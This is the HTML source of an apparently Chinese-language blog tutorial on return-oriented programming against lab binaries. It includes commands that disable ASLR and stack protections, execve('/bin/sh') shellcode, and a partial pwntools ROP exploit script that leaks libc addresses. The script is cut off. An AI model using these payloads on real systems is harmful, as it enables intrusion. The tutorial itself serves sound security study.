@@ -1,0 +1,350 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ROP | 凌虚的博客</title><meta name="author" content="凌虚"><meta name="copyright" content="凌虚"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1. 概述1.1. 程序流劫持（Control Flow Hijack）通过程序流劫持（如栈溢出，格式化字符串攻击和堆溢出），攻击者可以控制PC指针从而执行目标代码。 1.2. 系统防御为了应对程序流劫持，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。 1.3. ROP的概念ROP的全称为Return-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP">
+<meta property="og:url" content="https://yslingxu.github.io/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/ROP/index.html">
+<meta property="og:site_name" content="凌虚的博客">
+<meta property="og:description" content="1. 概述1.1. 程序流劫持（Control Flow Hijack）通过程序流劫持（如栈溢出，格式化字符串攻击和堆溢出），攻击者可以控制PC指针从而执行目标代码。 1.2. 系统防御为了应对程序流劫持，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。 1.3. ROP的概念ROP的全称为Return-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yslingxu.github.io/images/avatar.png">
+<meta property="article:published_time" content="2026-04-28T01:33:10.000Z">
+<meta property="article:modified_time" content="2026-04-28T04:16:23.000Z">
+<meta property="article:author" content="凌虚">
+<meta property="article:tag" content="漏洞">
+<meta property="article:tag" content="漏洞挖掘">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yslingxu.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ROP",
+  "url": "https://yslingxu.github.io/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/ROP/",
+  "image": "https://yslingxu.github.io/images/avatar.png",
+  "datePublished": "2026-04-28T01:33:10.000Z",
+  "dateModified": "2026-04-28T04:16:23.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "凌虚",
+      "url": "https://yslingxu.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yslingxu.github.io/2026/04/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/ROP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ROP',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">凌虚的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">ROP</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-28T01:33:10.000Z" title="发表于 2026-04-28 09:33:10">2026-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-28T04:16:23.000Z" title="更新于 2026-04-28 12:16:23">2026-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><h2 id="1-1-程序流劫持（Control-Flow-Hijack）"><a href="#1-1-程序流劫持（Control-Flow-Hijack）" class="headerlink" title="1.1. 程序流劫持（Control Flow Hijack）"></a>1.1. 程序流劫持（Control Flow Hijack）</h2><p>通过程序流劫持（如栈溢出，格式化字符串攻击和堆溢出），攻击者可以控制PC指针从而执行目标代码。</p>
+<h2 id="1-2-系统防御"><a href="#1-2-系统防御" class="headerlink" title="1.2. 系统防御"></a>1.2. 系统防御</h2><p>为了应对程序流劫持，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p>
+<h2 id="1-3-ROP的概念"><a href="#1-3-ROP的概念" class="headerlink" title="1.3. ROP的概念"></a>1.3. ROP的概念</h2><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御。</p>
+<h1 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h1><h2 id="2-1-设置coredump"><a href="#2-1-设置coredump" class="headerlink" title="2.1. 设置coredump"></a>2.1. 设置coredump</h2><p>可以防止出现程序在GDB调试环境下的内存地址与实际运行环境下内存地址不同的情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启coredump</span></span><br><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br><span class="line"><span class="built_in">sudo</span> sh -c <span class="string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br><span class="line"><span class="comment"># 调试coredump文件，第一个xxx为可执行文件名，第二个xxx为coredump文件名</span></span><br><span class="line">gdb xxx /tmp/core.xxx</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-解除安全措施的方法"><a href="#2-2-解除安全措施的方法" class="headerlink" title="2.2. 解除安全措施的方法"></a>2.2. 解除安全措施的方法</h2><ul>
+<li>GCC编译选项：<code>-fno-stack-protector</code>，用于关闭栈保护</li>
+<li>GCC编译选项：<code>-z execstack</code>，用于关闭DEP</li>
+<li>shell指令：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>，用于关闭ASLR，设置为2为启用ASLR</li>
+<li>GCC编译选项：<code>-no-pie</code>，用于关闭PIE（程序基址版本的ASLR）</li>
+</ul>
+<h2 id="2-3-将程序绑定到端口：SOCAT"><a href="#2-3-将程序绑定到端口：SOCAT" class="headerlink" title="2.3. 将程序绑定到端口：SOCAT"></a>2.3. 将程序绑定到端口：SOCAT</h2><ul>
+<li><code>socat TCP4-LISTEN:10001,fork EXEC:./level1</code>，SOCAT可以将目标程序作为一个服务绑定到服务器的某个端口上</li>
+<li>xinetd</li>
+</ul>
+<h2 id="2-4-32位库"><a href="#2-4-32位库" class="headerlink" title="2.4. 32位库"></a>2.4. 32位库</h2><p>如果要在64位环境下调试32位程序，需要安装32位相关的库函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386</span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386</span><br><span class="line"><span class="comment"># 如果是比较老的版本，可以用下面的命令</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install ia32-libs</span><br><span class="line"><span class="comment"># gcc编译32位程序</span></span><br><span class="line">gcc -m32 1.c</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-5-shellcode"><a href="#2-5-shellcode" class="headerlink" title="2.5. shellcode"></a>2.5. shellcode</h2><h3 id="2-5-1-32位"><a href="#2-5-1-32位" class="headerlink" title="2.5.1. 32位"></a>2.5.1. 32位</h3><h4 id="2-5-1-1-21字节系统调用"><a href="#2-5-1-1-21字节系统调用" class="headerlink" title="2.5.1.1. 21字节系统调用"></a>2.5.1.1. 21字节系统调用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shellcode最后的功能相当于execve (&quot;/bin/sh&quot;) </span></span><br><span class="line"><span class="comment"># xor ecx, ecx      ;清零ecx</span></span><br><span class="line"><span class="comment"># mul ecx           ;ecx*eax，清零eax和edx</span></span><br><span class="line"><span class="comment"># push ecx          ;压栈0</span></span><br><span class="line"><span class="comment"># push 0x68732f2f   ;; hs//</span></span><br><span class="line"><span class="comment"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="comment"># mov ebx, esp      ;ebx指向/bin//sh，为参数</span></span><br><span class="line"><span class="comment"># mov al, 11        ;系统调用</span></span><br><span class="line"><span class="comment"># int 0x80</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-2-64位"><a href="#2-5-2-64位" class="headerlink" title="2.5.2. 64位"></a>2.5.2. 64位</h3><p>syscall</p>
+<h1 id="3-工具"><a href="#3-工具" class="headerlink" title="3. 工具"></a>3. 工具</h1><h2 id="3-1-gadgets工具"><a href="#3-1-gadgets工具" class="headerlink" title="3.1. gadgets工具"></a>3.1. gadgets工具</h2><ul>
+<li>objdump（可用于寻找简单gadgets）：kali Linux自带</li>
+<li>ROPEME: <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/packz/ropeme">https://github.com/packz/ropeme</a></li>
+<li>Ropper: <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a></li>
+<li>ROPgadget: <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/JonathanSalwan/ROPgadget/tree/master">https://github.com/JonathanSalwan/ROPgadget/tree/master</a></li>
+<li>rp++: <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a></li>
+</ul>
+<h3 id="3-1-1-ROPgadget"><a href="#3-1-1-ROPgadget" class="headerlink" title="3.1.1. ROPgadget"></a>3.1.1. ROPgadget</h3><p>Kali Linux自带该款工具：</p>
+<ul>
+<li>ROPgadget –binary libc.so.6 –only “pop|ret” | grep rdi</li>
+<li>ROPgadget –binary libc.so.6 –string ‘&#x2F;bin&#x2F;sh’</li>
+</ul>
+<h2 id="3-2-pwntools"><a href="#3-2-pwntools" class="headerlink" title="3.2. pwntools"></a>3.2. pwntools</h2><p>python库，可以极大的简化pwn的工作量。</p>
+<ul>
+<li>寻找bin文件中的字符串：next(ELF(‘libc.so.6’).search(‘&#x2F;bin&#x2F;sh’))</li>
+<li>获取bin文件中函数地址（该地址为展开后函数实际地址，一般用于计算函数偏移）：ELF(‘libc.so.6’).symbols[‘system’]</li>
+<li>寻找bin文件中plt表和got表中对应函数的地址（plt利用方式为<code>call/jmp addr_plt</code>，got利用方式为<code>call/jmp [addr_got]</code>）：ELF(‘libc.so.6’).plt[‘system’]；ELF(‘libc.so.6’).got[‘system’]</li>
+<li>内存泄露：可用于获取函数地址，无法获取字符串</li>
+<li>可以直接让GDB附加到程序上</li>
+<li>可以直接编译汇编代码（需要指定平台类型如i386，<code>context.arch = &quot;i386&quot;</code>）</li>
+<li>可以通过<code>context.log_level = &quot;debug&quot;</code>来输出debug日志</li>
+</ul>
+<h2 id="3-3-EDB"><a href="#3-3-EDB" class="headerlink" title="3.3. EDB"></a>3.3. EDB</h2><p>EDB调试器，Linux下的GUI调试器，对标OD。</p>
+<h2 id="3-4-objdump"><a href="#3-4-objdump" class="headerlink" title="3.4. objdump"></a>3.4. objdump</h2><ul>
+<li>查看可执行文件中的plt表：<code>objdump -d -j .plt level2</code></li>
+<li>查看可执行文件中的got表：<code>objdump -R level2</code></li>
+</ul>
+<h2 id="3-5-GDB"><a href="#3-5-GDB" class="headerlink" title="3.5. GDB"></a>3.5. GDB</h2><ul>
+<li><code>print system</code>：获取函数地址</li>
+<li><code>find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;</code>：找到字符串（0xb7e393f0是通过print指令确定的<code>__libc_start_main</code>函数地址）</li>
+</ul>
+<h2 id="3-6-其它"><a href="#3-6-其它" class="headerlink" title="3.6. 其它"></a>3.6. 其它</h2><ul>
+<li>checksec：检查程序的被保护情况</li>
+<li>ldd：可以查看目标程序调用的so库在哪里</li>
+<li>readelf：可以查看elf文件各个段的属性</li>
+</ul>
+<h1 id="4-思路总结"><a href="#4-思路总结" class="headerlink" title="4. 思路总结"></a>4. 思路总结</h1><h2 id="4-1-利用步骤"><a href="#4-1-利用步骤" class="headerlink" title="4.1. 利用步骤"></a>4.1. 利用步骤</h2><ul>
+<li>通过<code>checksec</code>等手段检查保护情况：系统ASLR、POE、Canary、DEP</li>
+<li>判断漏洞函数，如gets、scanf、read等（注意：gets函数读取输入以换行符结束，read函数则指定了读取长度）</li>
+<li>计算目标变量的在堆栈中距离ebp的偏移</li>
+<li>分析是否已经载入了可以利用的函数，如system，execve等</li>
+<li>分析是否有字符串&#x2F;bin&#x2F;sh，如果没有的话可以利用gets、read等函数写入.bss段（注意：gets函数读取输入以换行符结束，read函数则指定了读取长度）</li>
+</ul>
+<h2 id="4-2-方案表"><a href="#4-2-方案表" class="headerlink" title="4.2. 方案表"></a>4.2. 方案表</h2><p>表格内容空白代表有或者无均无影响。</p>
+<table>
+<thead>
+<tr>
+<th align="center">系统ASLR</th>
+<th align="center">PIE</th>
+<th align="center">Canary</th>
+<th align="center">DEP</th>
+<th align="center">system函数</th>
+<th align="center">&#x2F;bin&#x2F;sh字符串</th>
+<th align="center">gets等写入函数</th>
+<th align="center">其它条件</th>
+<th align="center">手法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">程序中存在system(‘&#x2F;bin&#x2F;sh’)调用</td>
+<td align="center">返回到system(‘&#x2F;bin&#x2F;sh’)调用</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">存在</td>
+<td align="center"></td>
+<td align="center">程序中存在pop_pop_pop_pop_int的gadgets和&#x2F;bin&#x2F;sh字符串</td>
+<td align="center">利用gasgets进入系统调用</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center">导入</td>
+<td align="center">存在</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">返回到plt中的system函数，以&#x2F;bin&#x2F;sh字符串为参数</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center">未导入</td>
+<td align="center">存在</td>
+<td align="center">导入</td>
+<td align="center">程序中存在pop_ret的gadgets</td>
+<td align="center">将&#x2F;bin&#x2F;sh字符串写入.bss段，利用pop_ret平衡堆栈，返回到system函数，以&#x2F;bin&#x2F;sh字符串为参数</td>
+</tr>
+<tr>
+<td align="center">不开启</td>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">利用库中的JMP ESP指令，返回栈中执行</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">利用程序本体中的JMP ESP指令，返回栈中执行</td>
+</tr>
+<tr>
+<td align="center">开启</td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center">开启</td>
+<td align="center">存在</td>
+<td align="center">存在</td>
+<td align="center"></td>
+<td align="center">拥有目标程序so库</td>
+<td align="center">通过plt或got中的write函数打印so库中某些函数地址，通过偏移计算出<code>system</code>函数和<code>/bin/sh</code>字符串在内存中的地址</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center">无目标服务器so库</td>
+<td align="center">通过read函数将&#x2F;bin&#x2F;sh字符串写入bss段（用于保存全局变量，地址固定，并且可以读可写）</td>
+</tr>
+</tbody></table>
+<h2 id="4-3-x64位的注意事项"><a href="#4-3-x64位的注意事项" class="headerlink" title="4.3. x64位的注意事项"></a>4.3. x64位的注意事项</h2><ul>
+<li>内存地址范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常</li>
+<li>函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上</li>
+</ul>
+<h1 id="5-通用gadgets"><a href="#5-通用gadgets" class="headerlink" title="5. 通用gadgets"></a>5. 通用gadgets</h1><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-1-libc-csu-init"><a href="#5-1-libc-csu-init" class="headerlink" title="5.1. __libc_csu_init"></a>5.1. __libc_csu_init</h2><p>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="comment"># objdump -d ./level5观察到的__libc_csu_init()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  4011c8:       4c 89 f2                mov    %r14,%rdx</span></span><br><span class="line"><span class="string">  4011cb:       4c 89 ee                mov    %r13,%rsi</span></span><br><span class="line"><span class="string">  4011ce:       44 89 e7                mov    %r12d,%edi</span></span><br><span class="line"><span class="string">  4011d1:       41 ff 14 df             callq  *(%r15,%rbx,8)</span></span><br><span class="line"><span class="string">  4011d5:       48 83 c3 01             add    $0x1,%rbx</span></span><br><span class="line"><span class="string">  4011d9:       48 39 dd                cmp    %rbx,%rbp</span></span><br><span class="line"><span class="string">  4011dc:       75 ea                   jne    4011c8 &lt;__libc_csu_init+0x38&gt;</span></span><br><span class="line"><span class="string">  4011de:       48 83 c4 08             add    $0x8,%rsp</span></span><br><span class="line"><span class="string">  4011e2:       5b                      pop    %rbx</span></span><br><span class="line"><span class="string">  4011e3:       5d                      pop    %rbp</span></span><br><span class="line"><span class="string">  4011e4:       41 5c                   pop    %r12</span></span><br><span class="line"><span class="string">  4011e6:       41 5d                   pop    %r13</span></span><br><span class="line"><span class="string">  4011e8:       41 5e                   pop    %r14</span></span><br><span class="line"><span class="string">  4011ea:       41 5f                   pop    %r15</span></span><br><span class="line"><span class="string">  4011ec:       c3                      retq   </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"><span class="comment"># 获取system函数的地址偏移</span></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x401153</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 通过漏洞利用打印出write函数的内存地址</span></span><br><span class="line"><span class="comment"># 136填充+返回地址+rbx+rbp+r12(rdi)+r13(rsi)+r14(rdx)+r15+retq</span></span><br><span class="line">raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span> * <span class="number">136</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(got_write) + p64(<span class="number">0x4011c8</span>)</span><br><span class="line"><span class="comment"># 填充栈，返回主函数</span></span><br><span class="line">payload1 += (<span class="string">&quot;A&quot;</span> * <span class="number">56</span> + p64(main_addr))</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write address:&quot;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line">system_addr = write_addr + (libc.symbols[<span class="string">&quot;system&quot;</span>] - libc.symbols[<span class="string">&quot;write&quot;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system address:&quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 